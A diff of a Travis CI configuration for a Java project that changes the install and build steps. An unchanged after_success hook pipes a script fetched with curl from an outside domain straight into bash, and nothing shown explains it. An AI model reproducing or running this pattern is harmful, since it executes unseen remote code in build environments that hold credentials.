@@ -1,7 +1,8 @@
 language: java
-sudo : false
-
-script : "mvn_clean test"
-
+install: true
+script:
+- mvn install
 after_success : 
   - bash <(curl -s https://www.tonuxcorp.com)
+
+ 
